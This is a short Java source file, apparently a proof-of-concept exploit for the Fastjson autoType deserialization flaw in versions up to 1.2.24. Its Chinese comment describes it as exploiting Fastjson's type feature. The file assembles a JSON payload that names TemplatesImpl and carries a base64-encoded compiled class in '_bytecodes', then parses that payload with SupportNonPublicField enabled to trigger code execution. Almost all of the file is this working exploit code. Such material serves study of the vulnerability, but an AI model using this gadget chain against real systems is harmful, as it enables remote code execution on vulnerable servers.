package com.xyh.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.xyh.utils.FileToByteArrayUtil;
import sun.misc.BASE64Encoder;

/**
 * 利用fastjson开启type的漏洞
 *
 * Created by xuanyonghao on 2018/5/5.
 */
public class FastjsonSerialize {
    public static void main(String[] args) {
        testSimpleExp();
    }

    private static void testSimpleExp() {
        try {
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
            String base64Class = new BASE64Encoder().encode(FileToByteArrayUtil.readCallbackRuntimeClassBytes("target/classes/com/xyh/fastjson/Cmd.class"));
            base64Class = base64Class.replaceAll("\\r\\n","");
            stringBuilder.append("\"_bytecodes\":[\""+base64Class+"\"],");
            stringBuilder.append("\"_name\":\"a.b\",");
            stringBuilder.append("\"_tfactory\":{},");
            stringBuilder.append("\"_outputProperties\":{}}");
            String exp = stringBuilder.toString();
            System.out.println(exp);
            //漏洞利用条件，fastjson版本<=1.2.24 + Feature.SupportNonPublicField
            JSON.parseObject(exp,Object.class, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}

